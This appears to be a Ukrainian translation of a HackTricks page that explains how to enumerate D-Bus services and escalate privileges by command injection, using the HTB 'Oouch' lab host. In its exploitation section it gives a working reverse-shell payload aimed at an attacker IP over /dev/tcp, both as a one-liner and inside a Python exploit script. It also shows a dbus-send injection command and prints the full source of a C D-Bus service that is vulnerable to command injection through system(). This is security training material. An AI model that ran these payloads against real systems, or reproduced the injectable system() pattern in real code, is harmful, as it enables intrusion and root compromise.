# Перелік D-Bus та Підвищення Привілеїв Командним Впровадженням

{% hint style="success" %}
Вивчайте та практикуйте Хакінг AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання AWS Червоної Команди HackTricks (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте Хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання GCP Червоної Команди HackTricks (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

## **Перелік GUI**

D-Bus використовується як посередник міжпроцесних комунікацій (IPC) в середовищах робочого стола Ubuntu. На Ubuntu спостерігається одночасна робота кількох шин повідомлень: системної шини, яку в основному використовують **привілейовані служби для викладення служб, що є важливими для системи**, та сеансової шини для кожного ввійшовшого користувача, яка викладає служби, що є важливими лише для цього конкретного користувача. Основна увага тут спрямована на системну шину через її пов'язаність з службами, що працюють з вищими привілеями (наприклад, root), оскільки нашою метою є підвищення привілеїв. Варто зауважити, що архітектура D-Bus використовує 'маршрутизатор' для кожної сеансової шини, який відповідає за перенаправлення повідомлень клієнтів до відповідних служб на основі адреси, вказаної клієнтами для служби, з якою вони бажають спілкуватися.

Служби на D-Bus визначаються **об'єктами** та **інтерфейсами**, які вони викладають. Об'єкти можна порівняти з екземплярами класів у стандартних мовах ООП, при цьому кожен екземпляр унікально ідентифікується **шляхом об'єкта**. Цей шлях, схожий на шлях файлової системи, унікально ідентифікує кожен об'єкт, викладений службою. Ключовим інтерфейсом для дослідницьких цілей є інтерфейс **org.freedesktop.DBus.Introspectable**, який має один метод, Introspect. Цей метод повертає XML-представлення підтримуваних методів об'єкта, сигналів та властивостей, з фокусом на методах, при цьому виключаючи властивості та сигнали.

Для спілкування з інтерфейсом D-Bus використовувалися два інструменти: інструмент командного рядка під назвою **gdbus** для легкого виклику методів, викладених D-Bus у скриптах, та [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), інструмент на основі Python, призначений для переліку доступних служб на кожній шині та відображення об'єктів, що містяться в кожній службі.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


У першому зображенні показані служби, зареєстровані з системною шини D-Bus, з **org.debin.apt** спеціально підсвічено після вибору кнопки System Bus. D-Feet запитує цю службу для об'єктів, відображаючи інтерфейси, методи, властивості та сигнали для обраних об'єктів, які бачимо на другому зображенні. Детально описана сигнатура кожного методу.

Важливою особливістю є відображення **ідентифікатора процесу (pid)** та **командного рядка** служби, корисне для підтвердження того, чи служба працює з підвищеними привілеями, що важливо для актуальності дослідження.

**D-Feet також дозволяє виклик методу**: користувачі можуть вводити вирази Python як параметри, які D-Feet перетворює на типи D-Bus перед передачею службі.

Проте слід зауважити, що **для деяких методів потрібна аутентифікація**, перш ніж ми зможемо їх викликати. Ми ігноруватимемо ці методи, оскільки нашою метою є підвищення привілеїв без облікових даних в першу чергу.

Також слід зауважити, що деякі зі служб запитують іншу службу D-Bus з іменем org.freedeskto.PolicyKit1, чи користувачу слід дозволити виконувати певні дії чи ні.

## **Перелік командного рядка**

### Перелік об'єктів служби

Можливо перелічити відкриті інтерфейси D-Bus за допомогою:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Підключення

[З Вікіпедії:](https://en.wikipedia.org/wiki/D-Bus) Коли процес налаштовує підключення до шини, шина надає підключенню спеціальне ім'я шини, яке називається _унікальним ім'ям підключення_. Імена шин цього типу є незмінними - гарантується, що вони не зміняться, поки існує підключення, і, що ще важливіше, їх не можна повторно використовувати протягом життєвого циклу шини. Це означає, що жодне інше підключення до цієї шини ніколи не матиме такого унікального імені підключення, навіть якщо той самий процес закриє підключення до шини та створить нове. Унікальні імена підключення легко впізнавати, оскільки вони починаються з - іншогочарактеру, який зазвичай заборонений.

### Інформація про об'єкт служби

Потім ви можете отримати деяку інформацію про інтерфейс за допомогою:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Виведення списку інтерфейсів об'єкта служби

Вам потрібно мати достатньо дозволів.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Огляд Інтерфейсу Об'єкта Сервісу

Зверніть увагу, що в цьому прикладі було вибрано останній інтерфейс, виявлений за допомогою параметра `tree` (_див. попередній розділ_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
### Інтерфейс моніторингу/захоплення

За наявності достатніх привілеїв (привілеїв лише `send_destination` та `receive_sender` недостатньо) ви можете **моніторити комунікацію D-Bus**.

Для **моніторингу** **комунікації** вам потрібно мати права **root**. Якщо ви все ще маєте проблеми з правами root, перевірте [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) та [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Якщо ви знаєте, як налаштувати файл конфігурації D-Bus, щоб **дозволити не root користувачам перехоплювати** комунікацію, будь ласка, **зв'яжіться зі мною**!
{% endhint %}

Різні способи моніторингу:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
У наступному прикладі інтерфейс `htb.oouch.Block` моніториться, і **повідомлення "**_**lalalalal**_**" відправляється через неправильну комунікацію**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Можна використовувати `capture` замість `monitor`, щоб зберегти результати у файл pcap.

#### Фільтрація всього шуму <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Якщо на шині занадто багато інформації, передайте правило відповідно до такого шаблону:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Можна вказати кілька правил. Якщо повідомлення відповідає _будь-якому_ з правил, повідомлення буде надруковано. Наприклад:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Дивіться [документацію D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) для отримання додаткової інформації щодо синтаксису правил відповідності.

### Додатково

`busctl` має ще більше опцій, [**знайдіть їх всі тут**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Вразливий Сценарій**

Як користувач **qtc всередині хоста "oouch" з HTB**, ви можете знайти **неочікуваний файл конфігурації D-Bus**, розташований в _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Примітка з попередньої конфігурації, що **вам потрібно мати права користувача `root` або `www-data`, щоб надсилати та отримувати інформацію** через цю комунікацію D-BUS.

Як користувач **qtc** всередині контейнера Docker з ідентифікатором **aeb4525789d8**, ви можете знайти деякий код, пов'язаний з dbus у файлі _/code/oouch/routes.py._ Ось цей цікавий код:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Як ви можете побачити, це **підключення до інтерфейсу D-Bus** та відправка до функції **"Block"** параметру "client\_ip".

На іншому боці з'єднання D-Bus працює деякий скомпільований бінарний файл на мові програмування C. Цей код **очікує** на з'єднанні D-Bus **IP-адресу та викликає iptables через функцію `system`** для блокування вказаної IP-адреси.\
**Виклик до `system` має уразливість на внесення команд**, тому наведений нижче пейлоад створить зворотню оболонку: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Використання

В кінці цієї сторінки ви знайдете **повний код на мові програмування C додатка D-Bus**. В ньому між рядками 91-97 ви знайдете, як **зареєстровані `шлях об'єкта D-Bus`** та **`ім'я інтерфейсу`**. Ця інформація буде необхідна для відправлення даних до з'єднання D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Також, на рядку 57 ви можете знайти, що **єдиний зареєстрований метод** для цієї комунікації D-Bus називається `Block` (_**Тому в наступному розділі наведені вразливості будуть відправлені до об'єкта служби `htb.oouch.Block`, інтерфейсу `/htb/oouch/Block` та назви методу `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Наступний код Python надішле полезний навантаження на з'єднання D-Bus до методу `Block` через `block_iface.Block(runme)` (_зауважте, що він був видобутий з попереднього фрагменту коду_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl та dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` - це інструмент, який використовується для надсилання повідомлення на "Шину повідомлень"
* Шина повідомлень - це програмне забезпечення, яке використовується системами для спрощення комунікації між додатками. Вона пов'язана з Чергою повідомлень (повідомлення впорядковані послідовно), але в Шині повідомлень повідомлення надсилаються за моделлю підписки і також дуже швидко.
* Тег "-system" використовується для вказівки, що це системне повідомлення, а не сеансове (за замовчуванням).
* Тег "--print-reply" використовується для відображення нашого повідомлення належним чином та отримання будь-яких відповідей у форматі, зрозумілому для людини.
* "--dest=Dbus-Interface-Block" - Адреса інтерфейсу Dbus.
* "--string:" - Тип повідомлення, яке ми хочемо надіслати на інтерфейс. Існує кілька форматів надсилання повідомлень, таких як double, bytes, booleans, int, objpath. З цих форматів "object path" корисний, коли ми хочемо надіслати шлях до файлу на інтерфейс Dbus. У цьому випадку ми можемо використовувати спеціальний файл (FIFO), щоб передати команду на інтерфейс в ім'я файлу. "string:;" - Це для виклику шляху об'єкта знову, де ми розміщуємо файл обертання оболонки FIFO.

_Зверніть увагу, що в `htb.oouch.Block.Block` перший частину (`htb.oouch.Block`) посилається на об'єкт служби, а остання частина (`.Block`) посилається на назву методу._

### Код на мові C

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## References
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
Вивчайте та практикуйте хакінг AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
